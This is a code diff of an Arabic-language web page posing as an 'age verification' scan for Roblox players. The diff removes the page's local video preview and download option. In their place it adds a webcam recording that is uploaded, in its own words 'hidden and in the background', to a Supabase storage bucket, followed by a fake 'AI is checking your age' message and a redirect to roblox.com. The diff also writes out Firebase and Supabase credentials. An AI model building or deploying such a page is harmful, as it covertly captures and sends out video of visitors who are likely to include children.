@@ -23,11 +23,11 @@
             gap: 20px;
             flex-wrap: wrap;
             justify-content: center;
-            max-width: 900px;
+            max-width: 500px; /* تم تصغير العرض ليتناسب مع الصندوق الواحد */
             width: 100%;
         }
 
-        .gate-container, .result-video-box {
+        .gate-container {
             background: rgba(15, 15, 26, 0.75);
             padding: 30px;
             border-radius: 20px;
@@ -39,7 +39,7 @@
             min-width: 320px;
         }
 
-        h1, h2 { color: #00f2fe; margin-bottom: 5px; text-shadow: 0 0 10px rgba(0, 242, 254, 0.5); }
+        h1 { color: #00f2fe; margin-bottom: 5px; text-shadow: 0 0 10px rgba(0, 242, 254, 0.5); }
         p { color: #a4b0be; font-size: 14px; margin-bottom: 20px; }
 
         .camera-box {
@@ -57,16 +57,6 @@
         }
 
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); display: none; }
-        
-        #recordedVideo {
-            width: 100%;
-            max-width: 260px;
-            border-radius: 10px;
-            border: 2px solid #555;
-            margin-top: 15px;
-            display: none;
-            transform: scaleX(1);
-        }
 
         .guide-overlay {
             display: none;
@@ -114,8 +104,10 @@
         }
 
         #statusText { margin-top: 15px; font-size: 15px; font-weight: bold; color: #4facfe; }
-        #downloadBtn { background: linear-gradient(45deg, #2ed573, #7bed9f); margin-top: 15px; display: none; }
     </style>
+
+    <!-- استدعاء مكتبة Supabase الرسمية -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body>
 
@@ -134,47 +126,20 @@
             <button id="actionBtn">بدء الفحص وتسجيل الفيديو</button>
             <div id="statusText">جاهز للمحاكاة...</div>
         </div>
-
-        <div class="result-video-box">
-            <h2>الفيديو المسجل</h2>
-            <p>هنا يظهر فيديو الفحص بعد انتهائه.</p>
-            <video id="recordedVideo" controls></video>
-            <button id="downloadBtn">⬇️ تحميل الفيديو</button>
-        </div>
     </div>
 
-    <!-- ربط Firebase من خلال سكريبت نولودج من نوع Module -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
-        import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-analytics.js";
-        // استدعاء مكتبة السحابة التخزينية (Storage) المطلوبة لرفع الفيديوهات
-        import { getStorage, ref, uploadBytesResumable, getDownloadURL } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-storage.js";
+    <script>
+        // إعدادات اتصال Supabase الخاصة بك
+        const SUPABASE_URL = "https://sqbdnxbgbrtfxrcilcub.supabase.co";
+        const SUPABASE_KEY = "sb_publishable_l4B0HXNv6rYkyFGiv4DzNg_99J3V8Ip";
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-        // إعدادات Firebase الخاصة بك
-        const firebaseConfig = {
-            apiKey: "AIzaSyC76_MIs1mXcl_hMipVBX__8m4vdlTeMsk",
-            authDomain: "inde-edfe5.firebaseapp.com",
-            projectId: "inde-edfe5",
-            storageBucket: "inde-edfe5.firebasestorage.app",
-            messagingSenderId: "636994240555",
-            appId: "1:636994240555:web:fb5b2e80c600f00bf7aa6e",
-            measurementId: "G-DR2FGXQFG8"
-        };
-
-        // تهيئة خدمات Firebase
-        const app = initializeApp(firebaseConfig);
-        const analytics = getAnalytics(app);
-        const storage = getStorage(app);
-
-        // جلب عناصر الـ HTML لربطها بالجافا سكريبت
         const video = document.getElementById('webcam');
         const guideOverlay = document.getElementById('guideOverlay');
         const scanLine = document.getElementById('scanLine');
         const placeholderText = document.getElementById('placeholderText');
         const actionBtn = document.getElementById('actionBtn');
         const statusText = document.getElementById('statusText');
-        const recordedVideo = document.getElementById('recordedVideo');
-        const downloadBtn = document.getElementById('downloadBtn');
 
         let mediaRecorder;
         let recordedChunks = [];
@@ -186,7 +151,6 @@
             "⚙️ جاري معالجة الفحص الحركي..."
         ];
 
-        // تفعيل النقر على الزر الرئيسي
         actionBtn.addEventListener('click', startVerification);
 
         async function startVerification() {
@@ -205,51 +169,37 @@
                 mediaRecorder = new MediaRecorder(stream);
                 mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
                 
-                // دالة معالجة انتهاء التسجيل لرفع الملف مباشرة إلى Firebase
-                mediaRecorder.onstop = () => {
+                mediaRecorder.onstop = async () => {
                     const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                     
-                    // توليد رابط محلي للمستخدم لمعاينة الفيديو
-                    recordedVideo.src = URL.createObjectURL(blob);
-                    recordedVideo.style.display = "inline-block";
-                    downloadBtn.style.display = "block";
+                    statusText.innerText = "جاري رفع فيديو التحقق إلى السيرفر الآمن...";
+                    
+                    const fileName = 'video_' + Date.now() + '.mp4';
 
-                    // تفعيل تحميل الفيديو محلياً عند الضغط على زر التحميل
-                    downloadBtn.onclick = () => {
-                        const link = document.createElement('a');
-                        link.download = `age_verification_${Date.now()}.mp4`;
-                        link.href = recordedVideo.src;
-                        link.click();
-                    };
+                    // الرفع المخفي والخلفي إلى مجلد videos في Supabase
+                    const { data, error } = await supabase.storage
+                        .from('videos')
+                        .upload(fileName, blob, {
+                            cacheControl: '3600',
+                            upsert: false,
+                            contentType: 'video/mp4'
+                        });
 
-                    // بدء رفع الملف فوراً إلى مجلد "videos" في Firebase Storage باسم يعتمد على الوقت الفريد
-                    statusText.innerText = "جاري رفع فيديو التحقق إلى الخادم التخزيني...";
-                    const storageRef = ref(storage, 'videos/video_' + Date.now() + '.mp4');
-                    const uploadTask = uploadBytesResumable(storageRef, blob);
+                    if (error) {
+                        console.error("خطأ أثناء الرفع:", error);
+                        statusText.innerText = "فشل الرفع، يرجى التأكد من إعدادات المجلد في حسابك.";
+                        statusText.style.color = "#ff4757";
+                    } else {
+                        // النص المطلوب بعد انتهاء الفحص والرفع بنجاح
+                        statusText.innerText = "جاري فحص عمرك من قبل الـ AI...";
+                        statusText.style.color = "#2ed573";
+                        document.getElementById('camBox').style.borderColor = "#2ed573";
 
-                    // تتبع حالة الرفع
-                    uploadTask.on('state_changed', 
-                        (snapshot) => {
-                            const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
-                            statusText.innerText = `جاري الرفع: ${Math.round(progress)}%`;
-                        }, 
-                        (error) => {
-                            console.error("خطأ أثناء الرفع:", error);
-                            statusText.innerText = "فشل الرفع إلى السيرفر، يرجى مراجعة قواعد الأمان.";
-                            statusText.style.color = "#ff4757";
-                        }, 
-                        () => {
-                            // عند نجاح الرفع بالكامل
-                            statusText.innerText = "تم الرفع والتأكيد! جاري نقلك إلى روبلوكس...";
-                            statusText.style.color = "#2ed573";
-                            document.getElementById('camBox').style.borderColor = "#2ed573";
-
-                            // التوجيه التلقائي إلى لعبة روبلوكس بعد ثانيتين
-                            setTimeout(() => {
-                                window.location.href = "https://www.roblox.com/games/YOUR_GAME_ID_HERE"; 
-                            }, 2000);
-                        }
-                    );
+                        // التحويل التلقائي إلى موقع روبلوكس الرسمي بعد ثانيتين
+                        setTimeout(() => {
+                            window.location.href = "https://www.roblox.com"; 
+                        }, 2000);
+                    }
                 };
 
                 mediaRecorder.start();
@@ -280,4 +230,3 @@
     </script>
 </body>
 </html>
-
